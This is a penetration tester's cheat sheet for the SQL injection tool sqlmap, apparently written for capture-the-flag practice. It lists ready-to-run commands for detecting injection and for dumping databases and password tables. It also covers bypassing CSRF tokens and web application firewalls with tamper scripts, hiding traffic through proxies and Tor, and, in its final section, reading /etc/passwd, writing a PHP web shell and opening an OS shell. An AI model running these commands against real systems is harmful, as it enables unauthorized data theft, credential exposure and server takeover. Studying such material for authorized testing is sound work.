Main
```bash
sqlmap ... --batch  --level=5 --risk=3 --technique=BEU
sqlmap ... --batch  --level=5 --risk=3 --technique=BEU --privilege
sqlmap ... --batch  --level=5 --risk=3 --technique=BEU --os-shell
sqlmap ... --batch  --level=5 --risk=3 --technique=BEU --dbs
sqlmap ... --batch  --level=5 --risk=3 --technique=BEU -D testDB --tables
```
Advanced help
```shell
sqlmap -hh
sqlmap --parse-errors
sqlmap -t /tmp/traffic     <--Log traffic content/each request
sqlmap -v 6                <--Verbose mode 6 see requests.. 3 see payloads
sqlmap --proxy             <--Use a proxy like Burp to replay requests
```
### SQLMap Basic Attacks

> [!NOTE] NOTE
> It's always good to randomize the agent every time with `--random-agent`

Websocket + JSON testing
```bash
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id":"123"}' --batch
```

Batch test (`-u` for GET `--data` for POST)
```shell
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
sqlmap "http://www.example.com/vuln.php" --data 'id=1&user=test'--batch
sqlmap "http://www.example.com/vuln.php" --data 'id=1*&user=test'--batch
```

> [!NOTE] Note
> Using `Copy as cURL` within firefox is the best way to attack a specific target
> Having the * beside a data parameter tells SQLMap to focus on it

Using HTTP Request from Burp
```shell
sqlmap -r req.txt
```
Other switches: cookies, headers, user agents, referer
```shell
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

sqlmap --user-agent="..."
sqlmap ... --random-agent
sqlmap ... --mobile

sqlmap --referer='127.0.0.1'
sqlmap --method PUT
```
Inject into header values
```shell
sqlmap ... --cookie="id=1*"
```
### Tuning
Increase  amount of payloads and risk of DoS or loss of data
```shell
sqlmap ... --level=5 --risk=3
sqlmap ... --prefix="%'))" --suffix="-- -"
sqlmap ... --prefix='`)'
```

> [!NOTE] NOTE
>  in special cases of SQLi vulnerabilities, where usage of OR payloads is a must (e.g., in case of login pages), we may have to raise the risk level ourselves.
>  This is because OR payloads are inherently dangerous in a default run, where underlying vulnerable SQL statements (although less commonly) are actively modifying the database content (e.g. DELETE or UPDATE)

Specify detection method
```shell
sqlmap ... --code=200          <-- ex: HTTP code 200 TRUE 500 FALSE
sqlmap ... --titles            <-- difference in detection is in the HTML title
sqlmap ... --string=success    <-- "success" is shown if TRUE and not if FALSE
sqlmap ... --technique=BEU     <-- Only do boolean blind,error and UNION payloads
sqlmap ... --union-cols=5      <-- Specify amount of columns for Union based
```

> [!NOTE] IMPORTANT
> Sometimes SQLMap can't find everything on it's own. It's important to tune and tweak it by adding different `prefixes` and even specifying the amount of `columns` if you think you know the amount

### Database Enumeration
Banner, current user, database and is database Admin
```shell
sqlmap ...  --banner --current-user --current-db --is-dba --threads 10 
```
List databases, tables, table contents, specific table rows (start at row 3 stop at 10)
```shell
sqlmap ... --dbs --threads 10 
sqlmap ... -D testDB --tables --threads 10 
sqlmap ... -D testdb -T users --dump --threads 10 
sqlmap ... -D testdb -T users -C username,password --dump --threads 10 
sqlmap ... -D testdb -T users -C username,password --dump --start=3 --stop=10
```
Conditional enumeration
```shell
sqlmap ... -D testdb -T users --dump --where="username LIKE 'admin%'"
```
Dump all tables and databases
```shell
sqlmap ... --dump --threads 10 
sqlmap ... --dump-all
sqlmap ... --dump-all --exclude-sysdbs
```
### Advanced Database Enumeration
Retrieve the structure of all of the tables to have a complete overview of the database architecture
```shell 
sqlmap ... --schema
```
Search for table and column name in all databases (uses `LIKE`) - DO FOR ALL DBs
```shell
sqlmap ... --search -T user
sqlmap ... --search -C password
```
Enumerate system tables for passwords
```shell
sqlmap ... --passwords
```
### Bypass Web App Protections
Bypass CSRF by specifying the token name & contents. **CHECK FOR ANY TOKEN PARAMETERS IN REQUESTS**
```shell
sqlmap ... --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```
Unique value bypass. Randomize values of parameters in payloads. **CHECK FOR WHATS BEING RANDOMIZED/CHANGED IN REQUESTS** 
```shell
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5
```
Calculated Parameter bypass. Used when a web application expects a proper parameter value to be calculated based on some other parameter value(s).Most often, one parameter value has to contain the message digest (e.g. `h=MD5(id)`) of another one. Python code needed injunction with `--eval`
```shell 
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5
```
Proxies and Tor
```shell
sqlmap ... --proxy="socks4://177.39.187.70:33283"
sqlmap ... --proxy-file=/opt/proxies.txt
sqlmap ... --tor --check-tor
```
Skip WAF detection to create less noise
```shell
sqlmap ... --skip-waf
```
Tamper scripts are used to bypass WAFs/IPS solutions by obfuscating the payloads
```shell
sqlmap ... --tamper=between,randomcase
sqlmap ... --list-tampers
```
### OS Exploitation
View privileges
```bash
sqlmap ... --privilege
```
Need to be database administrator to preform the following
```shell 
sqlmap ...  --file-read "/etc/passwd"

sqlmap ... --file-write "shell.php" --file-dest "/var/www/html/shell.php"

sqlmap ... --os-shell
sqlmap ... --os-shell --technique=E
```